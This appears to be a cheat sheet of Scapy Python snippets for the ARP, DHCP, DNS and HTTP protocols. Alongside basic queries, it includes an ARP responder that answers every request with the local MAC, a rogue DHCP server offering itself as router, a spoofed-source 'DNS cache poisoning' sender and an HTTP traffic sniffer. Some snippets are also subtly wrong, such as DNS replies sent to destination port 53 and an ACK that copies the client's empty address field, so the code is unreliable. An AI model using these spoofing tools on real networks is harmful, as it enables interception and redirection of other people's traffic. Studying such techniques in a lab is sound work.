ARP - Request

# Define the target IP address for the ARP request
target_ip = '192.168.1.1'
# Construct an ARP request packet using the necessary layers and fields in Scapy
arp_request_pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=target_ip)
# Send the ARP request packet and receive the ARP reply packet
arp_reply_pkt = srp1(arp_request_pkt, timeout=2)
# Print the ARP reply packet
print(arp_reply_pkt.show())

ARP - Reply - Manual

# Define the source and destination MAC addresses and IP addresses for the ARP reply
sender_mac = '00:11:22:33:44:55'
sender_ip = '192.168.1.100'
target_mac = 'aa:bb:cc:dd:ee:ff'
target_ip = '192.168.1.1'
# Construct an ARP reply packet using the necessary layers and fields in Scapy
arp_reply_pkt = Ether(dst=target_mac)/ARP(op=2, hwsrc=sender_mac, psrc=sender_ip, hwdst=target_mac, pdst=target_ip)
# Send the ARP reply packet using the sendp() function in Scapy
sendp(arp_reply_pkt, iface=conf.iface)

ARP - Reply - Sniff Response

def arp_reply(pkt):
    # Check if the packet is an ARP request packet
    if ARP in pkt and pkt[ARP].op == 1:
        # Extract the source MAC and IP addresses from the ARP request packet
        src_mac = pkt[ARP].hwsrc
        src_ip = pkt[ARP].psrc
        # Define the destination MAC and IP addresses for the ARP reply packet
        dst_mac = pkt[ARP].hwdst
        dst_ip = pkt[ARP].pdst
        # Construct an ARP reply packet with the appropriate MAC and IP addresses
        arp_reply_pkt = Ether(src=get_if_hwaddr(conf.iface), dst=src_mac)/ARP(op=2, hwsrc=get_if_hwaddr(conf.iface), psrc=dst_ip, hwdst=src_mac, pdst=src_ip)
        # Send the ARP reply packet using the sendp() function in Scapy
        sendp(arp_reply_pkt, iface=conf.iface)
# Use Scapy's sniff() function to capture ARP packets on the network and call the arp_reply() function in response to ARP request packets - Infinite
sniff(filter="arp", prn=arp_reply)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------

DHCP - Request

def dhcp_discover():
    # Disable IP address validation in Scapy
    conf.checkIPaddr = False
    # Get the MAC address of the network interface that will be used for sending the DHCP request
    fam, hw = get_if_raw_hwaddr(conf.iface)
    # Construct a DHCP discover packet using the necessary layers and options in Scapy
    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0', dst='255.255.255.255')/UDP(sport=68, dport=67)/BOOTP(chaddr=hw)/DHCP(options=[('message-type', 'discover'), 'end'])
    # Send the DHCP discover packet using the srp() function in Scapy
    srp(dhcp_discover)
# Call the dhcp_request() function to execute the DHCP discovery process
dhcp_discover()

DHCP - Offer

# Define a function to send a DHCP Offer packet in response to a DHCP Discover packet
def dhcp_offer(pkt):
    # Check if the packet is a DHCP Discover packet
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
        # Get the MAC address of the client that sent the DHCP Discover packet
        client_mac = pkt[Ether].src
        # Get the MAC address of the network interface that will be used to send the DHCP Offer packet
        server_mac = get_if_hwaddr(conf.iface)
        # Set the IP address of the DHCP server
        server_ip = "192.168.1.1"
        # Set the IP address to be offered to the client
        offer_ip = "192.168.1.100"
        # Construct a DHCP Offer packet using the necessary layers and options in Scapy
        dhcp_offer_pkt = Ether(src=server_mac, dst=client_mac)/IP(src=server_ip, dst='255.255.255.255')/UDP(sport=67, dport=68)/BOOTP(op=2, yiaddr=offer_ip, siaddr=server_ip, chaddr=client_mac)/DHCP(options=[('message-type', 'offer'), ('server_id', server_ip), ('lease_time', 86400), ('subnet_mask', '255.255.255.0'), ('router', server_ip), 'end']) 
        # Send the DHCP Offer packet using the sendp() function in Scapy
        sendp(dhcp_offer_pkt, iface=conf.iface)
# Use Scapy's sniff() function to capture DHCP packets on the network and call the dhcp_offer() function in response to DHCP Discover packets
sniff(filter="udp and (port 67 or port 68)", prn=dhcp_offer)

DHCP - Request

def dhcp_request():
    # Disable IP address checking to allow sending packets with a source IP of 0.0.0.0
    conf.checkIPaddr = False
    # Get the MAC address of the network interface that will be used to send the DHCP request
    fam, hw = get_if_raw_hwaddr(conf.iface)
    # Construct a DHCP request packet using the necessary layers and options in Scapy
    dhcp_request_pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(sport=68, dport=67) / BOOTP(chaddr=hw) / DHCP(options=[('message-type', 'request'), ('requested_addr', '192.168.1.100'), ('server_id', '192.168.1.1'), 'end'])
    # Send the DHCP request packet and receive the DHCP response
    dhcp_response_pkt = srp1(dhcp_request_pkt, timeout=2)
    # Print the DHCP response packet
    print(dhcp_response_pkt.show())
# Call the dhcp_request() function to send a DHCP request and receive the DHCP response
dhcp_request()

DHCP - Acknowledge

# Define a function to send a DHCP Acknowledge packet in response to a DHCP Request packet
def dhcp_ack(pkt):
    # Check if the packet is a DHCP Request packet
    if DHCP in pkt and pkt[DHCP].options[0][1] == 3:
        # Get the MAC address of the client that sent the DHCP Request packet
        client_mac = pkt[Ether].src
        # Get the MAC address of the network interface that will be used to send the DHCP Acknowledge packet
        server_mac = get_if_hwaddr(conf.iface)
        # Set the IP address of the DHCP server
        server_ip = "192.168.1.1"
        # Get the IP address that was offered to the client in the DHCP Offer packet
        offered_ip = pkt[BOOTP].yiaddr
        # Construct a DHCP Acknowledge packet using the necessary layers and options in Scapy
        dhcp_ack_pkt = Ether(src=server_mac, dst=client_mac)/IP(src=server_ip, dst='255.255.255.255')/UDP(sport=67, dport=68)/BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip, chaddr=client_mac)/DHCP(options=[('message-type', 'ack'), ('server_id', server_ip), ('lease_time', 86400), ('subnet_mask', '255.255.255.0'), ('router', server_ip), 'end'])
        # Send the DHCP Acknowledge packet using the sendp() function in Scapy
        sendp(dhcp_ack_pkt, iface=conf.iface)
# Use Scapy's sniff() function to capture DHCP packets on the network and call the dhcp_ack() function in response to DHCP Request packets
sniff(filter="udp and (port 67 or port 68)", prn=dhcp_ack)

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

DNS - Query

def dns_query():
    # Define the DNS query name and server IP address
    dns_name = 'www.google.com'
    dns_server_ip = '8.8.8.8'
    # Construct a DNS query packet using Scapy
    dns_query_pkt = IP(dst=dns_server_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=dns_name))
    # Send the DNS query packet using Scapy's sr1() function and print the response
    dns_response_pkt = sr1(dns_query_pkt)
    print(dns_response_pkt.show())

DNS - Response

def dns_response():
    # Define the DNS response data and client IP address
    dns_response_data = '192.168.1.1'
    dns_client_ip = '192.168.1.100'
    # Construct a DNS response packet using Scapy
    dns_response_pkt = IP(dst=dns_client_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='www.google.com'), an=DNSRR(rrname='www.google.com', rdata=dns_response_data))
    # Send the DNS response packet using Scapy's send() function
    send(dns_response_pkt)

DNS - Cache Poisoning

def dns_cachePoisoning():
    # Define the DNS response data and client IP address
    dns_response_data = '192.168.1.2'
    dns_client_ip = '192.168.1.100'
    # Construct a DNS response packet with a spoofed source IP address
    dns_response_pkt = IP(src='10.0.0.1', dst=dns_client_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='www.google.com'), an=DNSRR(rrname='www.google.com', rdata=dns_response_data))
    # Send the DNS response packet using Scapy's send() function
    send(dns_response_pkt)
    
---------------------------------------------------------------------------------------------------------------------------------------------------------------

HTTP - Sniffing

# Define a function to process HTTP packets
def process_http_packet(packet):
    # Check if the packet has an HTTP request layer
    if packet.haslayer(HTTPRequest):
        # Extract the HTTP method, URL path, and host from the packet
        method = packet[HTTPRequest].Method.decode()
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # Print the HTTP method and URL using an f-string
        print(f'{method} {url}')


# Use Scapy's sniff function to capture HTTP packets on port 80 and call the process_http_packet function for each packet
sniff(filter='tcp port 80', prn=process_http_packet)



